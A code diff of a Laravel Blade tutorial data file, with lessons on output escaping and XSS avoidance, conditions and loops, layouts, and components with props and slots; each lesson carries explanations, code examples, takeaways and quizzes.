+{{-- ---------- Comments ---------- --}}
+{{-- Blade comment: compiled away, never sent to the browser. --}}
+<!-- HTML comment: the visitor can read this in view-source. -->`,
+      },
+      keyTakeaways: [
+        "<b>`{{ }}` escapes</b> for HTML and is what you should use for essentially everything.",
+        "<b>`{!! !!}` prints raw HTML</b> and is only safe for markup your own code produced.",
+        "Printing user input raw is <b>XSS</b>: the browser runs whatever they typed, for every visitor.",
+        "Untrusted means anything not written by your code: names, notes, CSV imports, API fields, filenames.",
+        "Escaping is <b>context-sensitive</b>. `{{ }}` is for HTML; inside `<script>` it is the wrong tool.",
+        "<b>`@json($value)`</b> encodes correctly for JavaScript, including quotes, arrays and objects.",
+        "`@{{ }}` and `@verbatim` leave braces alone for a front-end framework.",
+        "`{{-- --}}` is compiled away; an HTML comment is visible in view-source.",
+      ],
+      commonMistakes: [
+        "<b>Using `{!! !!}` to make some HTML in a database field render.</b> That field is exactly the attack surface XSS uses.",
+        "<b>Writing `\"{{ $value }}\"` inside a `<script>` block.</b> HTML escaping does not make a value safe as JavaScript. Use `@json`.",
+        "<b>Assuming imported data is trusted.</b> A CSV column or an API field is as untrusted as a form input.",
+        "<b>Sanitising with `strip_tags` and calling it safe.</b> Use a real purifier if you must accept rich text.",
+        "<b>Putting anything sensitive in an HTML comment.</b> It is delivered to the browser and readable in view-source.",
+      ],
+      quiz: [
+        {
+          question: "What is the difference between `{{ }}` and `{!! !!}`?",
+          options: [
+            "`{!! !!}` is faster",
+            "`{{ }}` only works with strings",
+            "`{{ }}` escapes HTML; `{!! !!}` prints it raw",
+            "There is none",
+          ],
+          correctIndex: 2,
+          explanation: "Escaping is what stops a user's input being executed as markup.",
+        },
+        {
+          question: "Why is `{!! $userInput !!}` dangerous?",
+          options: [
+            "The browser executes any script the user typed, for every visitor",
+            "It breaks caching",
+            "It is slower",
+            "It escapes twice",
+          ],
+          correctIndex: 0,
+          explanation: "That is cross-site scripting, and it is why escaping is the default.",
+        },
+        {
+          question: "How should you pass a PHP value into a `<script>` block?",
+          options: [
+            "`@json($value)`",
+            "`\"{{ $value }}\"`",
+            "`{!! $value !!}`",
+            "`{{-- $value --}}`",
+          ],
+          correctIndex: 0,
+          explanation: "`{{ }}` escapes for HTML, which is the wrong encoding inside JavaScript.",
+        },
+        {
+          question: "What does `@{{ message }}` do?",
+          options: [
+            "Escapes twice",
+            "Prints an empty string",
+            "Tells Blade to leave the braces alone for a JS framework",
+            "Runs PHP",
+          ],
+          correctIndex: 2,
+          explanation: "`@verbatim` does the same for a whole block.",
+        },
+      ],
+    },
+    {
+      id: "conditions-and-loops",
+      title: "Conditions, loops and $loop",
+      durationMinutes: 12,
+      explanation: "Blade's control structures are the same PHP ones with tidier syntax.\n\nA <b>directive</b> is a Blade instruction starting with `@`, like `@if` or `@foreach`, which compiles down to plain PHP. <b>`$loop`</b> is a variable Blade makes available inside every `@foreach`, describing where you are in the loop: which iteration you are on, whether it is the first or last, how many are left.\n\n---\n\n### 1. Basic — conditions\n\n```blade\n@if ($invoice['status'] === 'paid')\n    <span class=\"badge\">Paid</span>\n@elseif ($invoice['status'] === 'sent')\n    <span class=\"badge\">Awaiting payment</span>\n@else\n    <span class=\"badge\">Draft</span>\n@endif\n```\n\n`@unless` reads better than `@if (! ...)` when there is no else branch:\n\n```blade\n@unless ($invoice['status'] === 'paid')\n    <button>Pay now</button>\n@endunless\n```\n\nTwo checks that are not the same thing:\n\n```blade\n@isset($invoice['note'])     {{-- set and not null --}}\n@empty($invoices)            {{-- missing, null, empty array, 0 or \"\" --}}\n```\n\n`@empty($invoices)` is true for an empty array <i>and</i> for the number zero, which occasionally surprises people.\n\nAuthentication has its own pair, which you will use constantly:\n\n```blade\n@auth\n    <a href=\"{{ route('invoices.index') }}\">My invoices</a>\n@endauth\n\n@guest\n    <a href=\"{{ route('login') }}\">Log in</a>\n@endguest\n```\n\nAnd environment checks, useful for debug output:\n\n```blade\n@production\n    <script src=\"/analytics.js\"></script>\n@endproduction\n\n@env(['local', 'testing'])\n    <p>Environment: {{ app()->environment() }}</p>\n@endenv\n```\n\n---\n\n### 2. Intermediate — loops, and the one worth defaulting to\n\n```blade\n@foreach ($invoices as $invoice)\n    <tr><td>{{ $invoice['number'] }}</td></tr>\n@endforeach\n```\n\n<b>`@forelse` is usually the better default.</b> It handles the empty case in the same structure:\n\n```blade\n@forelse ($invoices as $invoice)\n    <tr><td>{{ $invoice['number'] }}</td></tr>\n@empty\n    <tr><td>No invoices yet.</td></tr>\n@endforelse\n```\n\nReaching for `@foreach` and forgetting the empty case is how a page ends up showing a table header above nothing, with no explanation for the user. `@forelse` makes the empty state impossible to skip, because it is part of the same block.\n\n`@for` and `@while` exist and are rarely what you want in a template. If you are incrementing a counter in Blade, the data probably needed shaping in the controller.\n\nTwo loop controls:\n\n```blade\n@foreach ($invoices as $invoice)\n    @continue($invoice['status'] === 'draft')     {{-- skip this one --}}\n    @break($loop->iteration > 10)                 {{-- stop entirely --}}\n\n    <tr><td>{{ $invoice['number'] }}</td></tr>\n@endforeach\n```\n\n---\n\n### 3. Advanced — the `$loop` variable\n\nInside any Blade loop, `$loop` is available for free:\n\n```text\n$loop->index        0-based position\n$loop->iteration    1-based position\n$loop->first        is this the first?\n$loop->last         is this the last?\n$loop->even / odd\n$loop->count        total items\n$loop->remaining    how many after this one\n$loop->depth        nesting level\n$loop->parent       the outer loop's $loop\n```\n\nThe two that earn their keep:\n\n```blade\n@foreach ($lines as $line)\n    {{ $line['description'] }}@if (! $loop->last), @endif\n@endforeach\n```\n\nThat prints `A, B, C` with no trailing comma, which otherwise needs a counter and an `if`.\n\n```blade\n<tr class=\"{{ $loop->even ? 'bg-gray-50' : '' }}\">\n```\n\nZebra striping with no counter at all.\n\n`$loop->parent` handles nesting, which is otherwise fiddly:\n\n```blade\n@foreach ($invoices as $invoice)\n    @foreach ($invoice['lines'] as $line)\n        Invoice {{ $loop->parent->iteration }}, line {{ $loop->iteration }}\n    @endforeach\n@endforeach\n```\n\nOne caution worth stating plainly. `$loop` is only available inside Blade's own loop directives. Write a raw `@php foreach (...) @endphp` loop and there is no `$loop`, which is one of several small reasons to stay with the directives.\n\nAnd `@php` blocks in general: they work, and a long one is a sign that the controller should have prepared the data.",
+      diagram: `@foreach vs @forelse
+
+  @foreach                        @forelse
+  loop the rows                   loop the rows
+  ...                             @empty
+  @endforeach                       "No invoices yet."
+                                  @endforelse
+  Empty list?
+  → header above nothing,         Empty list?
+    with no explanation           → a real message, and you
+                                    cannot forget to write it
+
+  Default to @forelse.
+
+
+$loop, free inside every Blade loop
+
+  index      0-based        first     is this the first?
+  iteration  1-based        last      is this the last?
+  count      total          even/odd  for striping
+  remaining  after this     parent    the outer loop's $loop
+
+
+  The comma problem, solved
+
+  @foreach ($lines as $line)
+      {{ $line['description'] }}@if (! $loop->last), @endif
+  @endforeach
+                    ↓
+              A, B, C          no trailing comma, no counter
+
+
+  $loop exists ONLY inside Blade loop directives.
+  A raw @php foreach (...) has no $loop.`,
+      codeExample: {
+        title: "Conditions, loops and $loop in one page",
+        code: `{{-- resources/views/invoices/index.blade.php --}}
+
+{{-- ---------- Auth-aware navigation ---------- --}}
+@auth
+    <a href="{{ route('invoices.index') }}">My invoices</a>
+@endauth
+
+@guest
+    <a href="{{ route('login') }}">Log in</a>
+@endguest
+
+
+{{-- ---------- The table ---------- --}}
+<table>
+    <thead>
+        <tr><th>Number</th><th>Client</th><th>Status</th></tr>
+    </thead>
+    <tbody>
+        {{-- @forelse, so the empty case cannot be forgotten --}}
+        @forelse ($invoices as $invoice)
+
+            {{-- Skip drafts without breaking the loop --}}
+            @continue($invoice['status'] === 'draft')
+
+            {{-- $loop->even gives zebra striping with no counter --}}
+            <tr class="{{ $loop->even ? 'bg-gray-50' : '' }}">
+                <td>{{ $loop->iteration }}. {{ $invoice['number'] }}</td>
+                <td>{{ $invoice['client'] }}</td>
+                <td>
+                    @if ($invoice['status'] === 'paid')
+                        <span class="badge badge-green">Paid</span>
+                    @elseif ($invoice['status'] === 'sent')
+                        <span class="badge">Awaiting payment</span>
+                    @else
+                        <span class="badge badge-grey">Draft</span>
+                    @endif
+                </td>
+                <td>
+                    @unless ($invoice['status'] === 'paid')
+                        <button>Pay now</button>
+                    @endunless
+                </td>
+            </tr>
+
+        @empty
+            <tr><td colspan="4">No invoices yet.</td></tr>
+        @endforelse
+    </tbody>
+</table>
+
+
+{{-- ---------- Joining without a trailing comma ---------- --}}
+<p>
+    Lines:
+    @foreach ($invoice['lines'] as $line)
+        {{ $line['description'] }}@if (! $loop->last), @endif
+    @endforeach
+</p>
+
+
+{{-- ---------- Nested loops: $loop->parent ---------- --}}
+@foreach ($invoices as $invoice)
+    @foreach ($invoice['lines'] as $line)
+        <p>Invoice {{ $loop->parent->iteration }}, line {{ $loop->iteration }}</p>
+    @endforeach
+@endforeach
+
+
+{{-- ---------- Presence checks (these differ) ---------- --}}
+@isset($invoice['note'])
+    <p>{{ $invoice['note'] }}</p>
+@endisset
+
+@empty($invoices)
+    <p>Nothing to show.</p>
+@endempty
+
+
+{{-- ---------- Environment ---------- --}}
+@production
+    <script src="/analytics.js"></script>
+@endproduction
+
+@env(['local', 'testing'])
+    <p>Environment: {{ app()->environment() }}</p>
+@endenv`,
+      },
+      keyTakeaways: [
+        "`@if` / `@elseif` / `@else` are the PHP equivalents with tidier syntax; `@unless` reads better than `@if (! ...)`.",
+        "<b>Default to `@forelse`</b>, because it makes the empty state part of the same block instead of something to remember.",
+        "`@isset` checks set and not null; `@empty` is also true for `0` and `\"\"`.",
+        "<b>`@auth` and `@guest`</b> handle logged-in and logged-out sections.",
+        "`@continue` and `@break` accept a condition inline: `@continue($x)`.",
+        "<b>`$loop`</b> is free inside every Blade loop: `iteration`, `first`, `last`, `even`, `count`, `remaining`, `parent`.",
+        "`$loop->last` solves the trailing-comma problem; `$loop->even` gives zebra striping with no counter.",
+        "`$loop` only exists inside Blade's loop directives, not a raw `@php foreach`.",
+      ],
+      commonMistakes: [
+        "<b>Using `@foreach` and forgetting the empty case.</b> The page shows a table header above nothing and the user cannot tell whether it is broken.",
+        "<b>Expecting `$loop` in a `@php foreach` block.</b> It is provided by the Blade directives only.",
+        "<b>Using `@empty($x)` to mean \"not set\".</b> It is also true for `0` and `\"\"`, which is rarely what you meant.",
+        "<b>Counting manually with `$i++` in a template.</b> `$loop->iteration` already exists.",
+        "<b>Writing long `@php` blocks.</b> If a template needs that much logic, the controller should have prepared the data.",
+      ],
+      quiz: [
+        {
+          question: "Why default to `@forelse` over `@foreach`?",
+          options: [
+            "It is faster",
+            "The empty case is part of the same block, so it cannot be forgotten",
+            "`@foreach` cannot use `$loop`",
+            "It handles nesting better",
+          ],
+          correctIndex: 1,
+          explanation: "Otherwise an empty list renders a header above nothing.",
+        },
+        {
+          question: "What does `$loop->last` help you avoid?",
+          options: [
+            "Extra queries",
+            "Escaping issues",
+            "Nested loops",
+            "A trailing comma when joining items",
+          ],
+          correctIndex: 3,
+          explanation: "`{{ $x }}@if (! $loop->last), @endif` prints A, B, C cleanly.",
+        },
+        {
+          question: "Where is `$loop` available?",
+          options: [
+            "Anywhere in a Blade file",
+            "Only inside Blade's loop directives",
+            "Only in components",
+            "Only in the first loop",
+          ],
+          correctIndex: 1,
+          explanation: "A raw `@php foreach (...)` block has no `$loop`.",
+        },
+        {
+          question: "What is true of `@empty($invoices)` that surprises people?",
+          options: [
+            "It only works on arrays",
+            "It requires a closing tag",
+            "It is also true for `0` and `\"\"`",
+            "It queries the database",
+          ],
+          correctIndex: 2,
+          explanation: "`@isset` is the check for set and not null.",
+        },
+      ],
+    },
+    {
+      id: "layouts",
+      title: "Layouts: inheritance and component layouts",
+      durationMinutes: 11,
+      explanation: "Every page shares a shell: the doctype, the head, the navigation, the footer. You write it once.\n\nA <b>layout</b> is that shared shell: doctype, head, navigation, footer, written once and reused by every page.\n\nBlade offers two ways, and they are genuinely different in feel. With <b>template inheritance</b>, a child view extends a parent and fills in named <b>sections</b>. With a <b>component layout</b>, the shell is a component and the page is passed into it as a slot.\n\n---\n\n### 1. Basic — template inheritance\n\nThe layout defines holes with `@yield`:\n\n```blade\n{{-- resources/views/layouts/app.blade.php --}}\n<!DOCTYPE html>\n<html>\n<head>\n    <title>@yield('title', 'InvoiceHub')</title>\n</head>\n<body>\n    <header>InvoiceHub</header>\n\n    <main>\n        @yield('content')\n    </main>\n</body>\n</html>\n```\n\nThe page fills them with `@section`:\n\n```blade\n@extends('layouts.app')\n\n@section('title', 'Invoices')\n\n@section('content')\n    <h1>Invoices</h1>\n@endsection\n```\n\n```text\nlayouts/app.blade.php\n        ↑ @extends\ninvoices/index.blade.php\n        ↓\n    final HTML\n```\n\nTwo details. `@yield('title', 'InvoiceHub')` takes a default for pages that do not set it. And `@section('title', 'Invoices')` has a one-line form when the content is a single value.\n\n`@parent` keeps the layout's version and adds to it:\n\n```blade\n@section('sidebar')\n    @parent\n    <p>Invoice filters</p>\n@endsection\n```\n\n---\n\n### 2. Intermediate — component layouts\n\nThe newer approach treats the layout as a component. The layout receives content through `$slot`:\n\n```blade\n{{-- resources/views/components/layout.blade.php --}}\n<!DOCTYPE html>\n<html>\n<head>\n    <title>{{ $title ?? 'InvoiceHub' }}</title>\n</head>\n<body>\n    <header>InvoiceHub</header>\n\n    <main>\n        {{ $slot }}\n    </main>\n</body>\n</html>\n```\n\nThe page wraps itself in it:\n\n```blade\n<x-layout title=\"Invoices\">\n    <h1>Invoices</h1>\n</x-layout>\n```\n\nThe difference in mental model is the interesting part:\n\n```text\nINHERITANCE                    COMPONENT\nthe child says                 the child says\n\"I am inside this layout\"      \"wrap me in this layout\"\n\nthe layout pulls               the page pushes\ncontent from named sections    content into a slot\n```\n\nPractically:\n\n```text\n@extends          <x-layout>\n─────────         ──────────\nseveral named     one main slot, plus named slots\n  sections          when you need more\n@parent for       plain PHP defaults: $title ?? '...'\n  additive bits\none layout per    layouts nest naturally, like any\n  page              other component\n```\n\nNeither is deprecated. Both appear in the current documentation.\n\n---\n\n### 3. Advanced — choosing, and not mixing\n\nA reasonable rule: if your application already uses Blade components for buttons, cards and alerts, use a component layout so there is one system rather than two. If you are maintaining something built on `@extends`, leave it alone; converting a working layout buys nothing.\n\nWhat you should avoid is <b>mixing them in one page</b>. A template that both `@extends` a layout and wraps parts in `<x-layout>` is confusing to follow and easy to get subtly wrong.\n\nTwo things people expect to work and which do not:\n\n<b>Sections do not work inside components.</b> `@section` belongs to the inheritance system. Inside a component layout, use named slots instead:\n\n```blade\n<x-layout>\n    <x-slot:header>\n        <h1>Invoices</h1>\n    </x-slot:header>\n\n    <p>The main content.</p>\n</x-layout>\n```\n\n<b>`@yield` returns a string, it does not delay rendering.</b> Anything you put in a `@section` is rendered at that point, so a section is not a way to defer expensive work.\n\nFor scripts and styles a page needs, neither layout style is the answer. That is what stacks are for, and they arrive in the lesson after next.",
+      diagram: `Two ways to share a shell
+
+INHERITANCE                        COMPONENT
+layouts/app.blade.php              components/layout.blade.php
+  @yield('title')                    {{ $title ?? 'InvoiceHub' }}
+  @yield('content')                  {{ $slot }}
+        ↑                                  ↑
+  @extends('layouts.app')            <x-layout title="Invoices">
+  @section('title', 'Invoices')          <h1>Invoices</h1>
+  @section('content') ... @endsection  </x-layout>
+
+  the child declares its parent      the child wraps itself
+  the layout PULLS from sections     the page PUSHES into a slot
+
+
+Choosing
+
+  Already using Blade components?     → component layout
+    (buttons, cards, alerts)             one system, not two
+
+  Maintaining an @extends codebase?   → leave it
+                                         converting buys nothing
+
+  Never mix both in one page.
+
+
+What does not carry across
+
+  @section inside a component   ✗   use named slots instead
+  @yield to defer work          ✗   it renders immediately
+
+  Page-specific scripts and styles belong in
+  neither: that is what @stack is for.`,
+      codeExample: {
+        title: "The same page, both layout styles",
+        code: `{{-- ============ INHERITANCE ============ --}}
+
+{{-- resources/views/layouts/app.blade.php --}}
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="utf-8">
+    <title>@yield('title', 'InvoiceHub')</title>
+    @stack('styles')
+</head>
+<body>
+    <header>
+        <a href="{{ route('invoices.index') }}">InvoiceHub</a>
+    </header>
+
+    <main>
+        @yield('content')
+    </main>
+
+    @section('sidebar')
+        <p>Default sidebar</p>
+    @endsection
+
+    <footer>&copy; {{ date('Y') }}</footer>
+    @stack('scripts')
+</body>
+</html>
+
+
+{{-- resources/views/invoices/index.blade.php --}}
+@extends('layouts.app')
+
+{{-- One-line form, for a single value --}}
+@section('title', 'Invoices')
+
+@section('sidebar')
+    @parent                       {{-- keep the layout's version, add to it --}}
+    <p>Invoice filters</p>
+@endsection
+
+@section('content')
+    <h1>Invoices</h1>
+@endsection
+
+
+{{-- ============ COMPONENT LAYOUT ============ --}}
+
+{{-- resources/views/components/layout.blade.php --}}
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="utf-8">
+    {{-- Plain PHP defaults, no @yield needed --}}
+    <title>{{ $title ?? 'InvoiceHub' }}</title>
+    @stack('styles')
+</head>
+<body>
+    <header>
+        <a href="{{ route('invoices.index') }}">InvoiceHub</a>
+    </header>
+
+    {{-- A named slot, with a fallback if the page does not supply one --}}
+    @isset($header)
+        <div class="page-header">{{ $header }}</div>
+    @endisset
+
+    <main>
+        {{ $slot }}
+    </main>
+
+    <footer>&copy; {{ date('Y') }}</footer>
+    @stack('scripts')
+</body>
+</html>
+
+
+{{-- resources/views/invoices/index.blade.php --}}
+<x-layout title="Invoices">
+    <x-slot:header>
+        <h1>Invoices</h1>
+    </x-slot:header>
+
+    <table>
+        {{-- ... --}}
+    </table>
+</x-layout>
+
+
+{{-- Do NOT do both in one page. --}}`,
+      },
+      keyTakeaways: [
+        "<b>Inheritance</b>: the layout declares `@yield` holes and the page fills them with `@section`.",
+        "`@yield('title', 'Default')` takes a fallback; `@section('title', 'Invoices')` has a one-line form.",
+        "<b>`@parent`</b> keeps the layout's version of a section and appends to it.",
+        "<b>Component layouts</b>: the page wraps itself in `<x-layout>` and content arrives as `$slot`.",
+        "The mental models differ: inheritance <b>pulls</b> from named sections, components <b>push</b> into slots.",
+        "Neither is deprecated. Pick the component layout if your UI already uses Blade components.",
+        "<b>Never mix both in one page.</b>",
+        "`@section` does not work inside a component; use named slots. And `@yield` renders immediately, so it cannot defer work.",
+      ],
+      commonMistakes: [
+        "<b>Mixing `@extends` and `<x-layout>` in the same template.</b> Two layout systems in one file is confusing and subtly breakable.",
+        "<b>Using `@section` inside a component layout.</b> Sections belong to the inheritance system; components use slots.",
+        "<b>Forgetting `@endsection` or `@endforeach`.</b> Blade's error points at the compiled file, so the message rarely names the line you need.",
+        "<b>Putting page-specific scripts in a section.</b> Stacks exist for exactly that and compose properly.",
+        "<b>Converting a working `@extends` layout for the sake of modernity.</b> Both are supported; the churn buys nothing.",
+      ],
+      quiz: [
+        {
+          question: "In template inheritance, what does `@yield('content')` do?",
+          options: [
+            "Marks where the child's matching `@section` is inserted",
+            "Defines content",
+            "Includes another view",
+            "Creates a component",
+          ],
+          correctIndex: 0,
+          explanation: "The layout pulls content from named sections.",
+        },
+        {
+          question: "How does a page pass its main content to a component layout?",
+          options: [
+            "With `@section`",
+            "With `@yield`",
+            "With `@include`",
+            "As `$slot`",
+          ],
+          correctIndex: 3,
+          explanation: "Anything between the opening and closing tags becomes `$slot`.",
+        },
+        {
+          question: "What does `@parent` do?",
+          options: [
+            "Extends a layout",
+            "Keeps the layout's version of the section and adds to it",
+            "Calls the parent controller",
+            "References the outer loop",
+          ],
+          correctIndex: 1,
+          explanation: "Useful when a page should add to a default sidebar rather than replace it.",
+        },
+        {
+          question: "Why should you not use `@section` inside a component layout?",
+          options: [
+            "It is slower",
+            "It only works in the layout",
+            "It causes an infinite loop",
+            "Sections belong to the inheritance system; components use slots",
+          ],
+          correctIndex: 3,
+          explanation: "Named slots are the component equivalent.",
+        },
+      ],
+    },
+    {
+      id: "components",
+      title: "Blade components, props and slots",
+      durationMinutes: 13,
+      explanation: "A <b>component</b> is a reusable piece of interface: a button, a badge, an alert, a card.\n\nA <b>prop</b> is a value a component declares that it expects to be given. A <b>slot</b> is the content passed between the component's opening and closing tags. Those two do most of the work in this lesson.\n\n---\n\n### 1. Basic — anonymous components\n\nThe simplest kind is a Blade file with no PHP class at all. Put it in `resources/views/components/`:\n\n```blade\n{{-- resources/views/components/alert.blade.php --}}\n<div class=\"alert\">\n    {{ $slot }}\n</div>\n```\n\nUse it:\n\n```blade\n<x-alert>\n    Something went wrong.\n</x-alert>\n```\n\n`$slot` holds whatever went between the tags. The filename becomes the tag name, and nesting maps to dots:\n\n```text\ncomponents/alert.blade.php         → <x-alert>\ncomponents/forms/input.blade.php   → <x-forms.input>\n```\n\nMost components you write never need a class. Start here.\n\n---\n\n### 2. Intermediate — props and attributes\n\nDeclare the data a component expects with `@props`, giving defaults where sensible:\n\n```blade\n{{-- resources/views/components/alert.blade.php --}}\n@props(['type' => 'info', 'dismissible' => false])\n\n<div class=\"alert alert-{{ $type }}\">\n    {{ $slot }}\n\n    @if ($dismissible)\n        <button>&times;</button>\n    @endif\n</div>\n```\n\n```blade\n<x-alert type=\"error\">Payment failed.</x-alert>\n<x-alert :type=\"$status\" :dismissible=\"true\">Saved.</x-alert>\n```\n\nThe colon is the important bit. Without it you pass a <b>string</b>; with it you pass a <b>PHP expression</b>:\n\n```blade\ntype=\"error\"        the string \"error\"\n:type=\"$status\"     the value of $status\n:dismissible=\"true\" the boolean true, not the string \"true\"\n```\n\nForgetting the colon on a boolean is a classic: `dismissible=\"false\"` passes the non-empty string `\"false\"`, which is truthy, so the button appears anyway.\n\nAnything not declared in `@props` lands in `$attributes`, and `merge` combines it with your defaults:\n\n```blade\n@props(['type' => 'info'])\n\n<div {{ $attributes->merge(['class' => 'alert alert-'.$type]) }}>\n    {{ $slot }}\n</div>\n```\n\n```blade\n<x-alert class=\"mt-4\" id=\"save-alert\">Saved.</x-alert>\n```\n\nThe rendered `class` is `alert alert-info mt-4`, and `id` passes through untouched. That is what makes a component reusable rather than rigid: callers can add to it without you predicting every attribute.\n\nRelated helpers:\n\n```blade\n{{ $attributes->class(['alert', 'alert-error' => $type === 'error']) }}\n{{ $attributes->except('class') }}\n{{ $attributes->only('id') }}\n```\n\n---\n\n### 3. Advanced — named slots, class components and `@aware`\n\nOne `$slot` is often not enough. <b>Named slots</b> give a component several insertion points:\n\n```blade\n{{-- resources/views/components/card.blade.php --}}\n<div class=\"card\">\n    @isset($header)\n        <div class=\"card-header\">{{ $header }}</div>\n    @endisset\n\n    <div class=\"card-body\">{{ $slot }}</div>\n\n    @isset($footer)\n        <div class=\"card-footer\">{{ $footer }}</div>\n    @endisset\n</div>\n```\n\n```blade\n<x-card>\n    <x-slot:header>Invoice INV-001</x-slot:header>\n\n    <p>Total: $500</p>\n\n    <x-slot:footer>\n        <button>Pay</button>\n    </x-slot:footer>\n</x-card>\n```\n\nWrap optional slots in `@isset` so a missing one does not render an empty wrapper.\n\nWhen a component needs real logic, generate a <b>class component</b>:\n\n```bash\nphp artisan make:component InvoiceStatus\n```\n\nThat creates `app/View/Components/InvoiceStatus.php` and `resources/views/components/invoice-status.blade.php`. The class computes; the template displays:\n\n```php\nclass InvoiceStatus extends Component\n{\n    public function __construct(public string $status) {}\n\n    public function colour(): string\n    {\n        return match ($this->status) {\n            'paid' => 'green',\n            'sent' => 'blue',\n            default => 'grey',\n        };\n    }\n\n    public function render(): View\n    {\n        return view('components.invoice-status');\n    }\n}\n```\n\nPublic properties and methods are available in the template. Note the naming: `InvoiceStatus` becomes `<x-invoice-status>`, so the class is StudlyCase and the tag is kebab-case.\n\nFinally, <b>`@aware`</b> lets a child read a prop given to its parent:\n\n```blade\n{{-- components/menu.blade.php --}}\n@props(['colour' => 'blue'])\n<ul {{ $attributes }}>{{ $slot }}</ul>\n\n{{-- components/menu/item.blade.php --}}\n@aware(['colour' => 'blue'])\n<li class=\"text-{{ $colour }}\">{{ $slot }}</li>\n```\n\n```blade\n<x-menu colour=\"red\">\n    <x-menu.item>Invoices</x-menu.item>\n</x-menu>\n```\n\nThe item picks up `red` without it being passed down by hand. The catch, which is easy to trip over: `@aware` only reads props the parent received <i>as attributes</i>. A value the parent computed internally is not visible.",
+      diagram: `Anonymous components: a file is enough
+
+  resources/views/components/alert.blade.php   →  <x-alert>
+  resources/views/components/forms/input...    →  <x-forms.input>
+
+  Most components never need a PHP class. Start here.
+
+
+The colon changes everything
+
+  type="error"          the STRING "error"
+  :type="$status"       the VALUE of $status
+  :dismissible="true"   the BOOLEAN true
+
+  dismissible="false"   the string "false"  ← truthy!
+                        the button appears anyway
+
+
+Props vs attributes
+
+  @props(['type' => 'info'])        declared → your variables
+  everything else                    → $attributes
+
+  <x-alert type="error" class="mt-4" id="a">
+            └─ prop ─┘   └── attributes ──┘
+
+  {{ $attributes->merge(['class' => 'alert']) }}
+              ↓
+  class="alert mt-4"  id="a"
+
+  Callers extend the component without you
+  predicting every attribute.
+
+
+Named slots
+
+  <x-card>
+      <x-slot:header>  →  {{ $header }}
+      ...content...    →  {{ $slot }}
+      <x-slot:footer>  →  {{ $footer }}
+  </x-card>
+
+  Wrap optional ones in @isset, or you render empty wrappers.`,
+      codeExample: {
+        title: "Anonymous, class-based, slots and @aware",
+        code: `{{-- ---------- Anonymous component with props ---------- --}}
+{{-- resources/views/components/alert.blade.php --}}
+@props(['type' => 'info', 'dismissible' => false])
+
+<div {{ $attributes->merge(['class' => 'alert alert-'.$type]) }}>
+    {{ $slot }}
+
+    @if ($dismissible)
+        <button type="button">&times;</button>
+    @endif
+</div>
+
+
+{{-- Using it --}}
+<x-alert>Saved.</x-alert>
+<x-alert type="error">Payment failed.</x-alert>
+
+{{-- The colon passes a PHP expression, not a string --}}
+<x-alert :type="$invoice['status']" :dismissible="true">Saved.</x-alert>
+
+{{-- WRONG: "false" is a non-empty string, so this is truthy
+     and the dismiss button renders anyway. --}}
+<x-alert dismissible="false">Careful.</x-alert>
+
+{{-- Extra attributes merge with the component's own --}}
+<x-alert class="mt-4" id="save-alert">Saved.</x-alert>
+{{-- renders: class="alert alert-info mt-4" id="save-alert" --}}
+
+
+{{-- ---------- Named slots ---------- --}}
+{{-- resources/views/components/card.blade.php --}}
+<div class="card">
+    @isset($header)
+        <div class="card-header">{{ $header }}</div>
+    @endisset
+
+    <div class="card-body">{{ $slot }}</div>
+
+    @isset($footer)
+        <div class="card-footer">{{ $footer }}</div>
+    @endisset
+</div>
+
+<x-card>
+    <x-slot:header>Invoice INV-001</x-slot:header>
+
+    <p>Total: $500</p>
+
+    <x-slot:footer>
+        <button>Pay</button>
+    </x-slot:footer>
+</x-card>
+
+<?php
+// ---------- Class component, for real logic ----------
+// php artisan make:component InvoiceStatus
+// InvoiceStatus  →  <x-invoice-status>   (StudlyCase → kebab-case)
+
+namespace App\\View\\Components;
+
+use Illuminate\\View\\Component;
+use Illuminate\\Contracts\\View\\View;
+
+class InvoiceStatus extends Component
 {
-    public function rules(): array
+    public function __construct(public string $status) {}
+
+    // Public methods are callable from the template.
+    public function colour(): string
     {
-        return [
-            // bail: stop at the first failure, so \`unique\` never runs a
-            // query for a value already known to be invalid.
-            'number' => ['bail', 'required', 'string', new ValidInvoiceNumber,
-                         'unique:invoices,number'],
-
-            // ---------- Nested object ----------
-            'client'       => ['required', 'array'],
-            'client.name'  => ['required', 'string', 'max:100'],
-            'client.email' => ['required', 'email'],
-
-            // ---------- Array of objects ----------
-            // Validate the array itself as well as its items: 'array'
-            // alone accepts an empty one, and without max someone can
-            // post 50,000 lines.
-            'lines'               => ['required', 'array', 'min:1', 'max:100'],
-            'lines.*.description' => ['required', 'string', 'max:200'],
-            'lines.*.quantity'    => ['required', 'integer', 'min:1'],
-            'lines.*.unit_price'  => ['required', 'numeric', 'min:0'],
-
-            // ---------- A one-off closure rule ----------
-            'reference' => [
-                'nullable',
-                function (string $attribute, mixed $value, Closure $fail) {
-                    if (str_contains($value, ' ')) {
-                        $fail('The :attribute cannot contain spaces.');
-                    }
-                },
-            ],
-        ];
+        return match ($this->status) {
+            'paid'  => 'green',
+            'sent'  => 'blue',
+            default => 'grey',
+        };
     }
 
-    // Key is field.rule. Wildcards work here too.
-    public function messages(): array
+    public function render(): View
     {
-        return [
-            'number.required'      => 'Every invoice needs a number.',
-            'number.unique'        => 'That invoice number is already in use.',
-            'lines.min'            => 'Add at least one line item.',
-            'lines.*.quantity.min' => 'Quantities must be at least 1.',
-            'amount.min'           => 'The :attribute must be at least :min.',
-        ];
-    }
-
-    // Fix the NAME once instead of rewriting every message for it.
-    public function attributes(): array
-    {
-        return [
-            'client_id'          => 'client',
-            'lines.*.unit_price' => 'unit price',
-        ];
-    }
-
-    // Runs after the normal rules: for checks spanning several fields.
-    public function after(): array
-    {
-        return [
-            function (Validator $validator) {
-                if ($this->input('paid_at') && ! $this->input('payment_method')) {
-                    $validator->errors()->add(
-                        'payment_method',
-                        'A payment method is required when a payment date is set.',
-                    );
-                }
-            },
-        ];
+        return view('components.invoice-status');
     }
 }
 ?>
 
-<?php
-// php artisan make:rule ValidInvoiceNumber
-namespace App\\Rules;
+{{-- resources/views/components/invoice-status.blade.php --}}
+<span class="badge badge-{{ $colour() }}">{{ ucfirst($status) }}</span>
 
-use Closure;
-use Illuminate\\Contracts\\Validation\\ValidationRule;
+{{-- <x-invoice-status :status="$invoice['status']" /> --}}
 
-class ValidInvoiceNumber implements ValidationRule
-{
-    // Call $fail to reject. Returning a value does nothing.
-    public function validate(string $attribute, mixed $value, Closure $fail): void
-    {
-        if (! preg_match('/^INV-\\d{3}$/', $value)) {
-            $fail('The :attribute must look like INV-001.');
-        }
-    }
-}`,
+
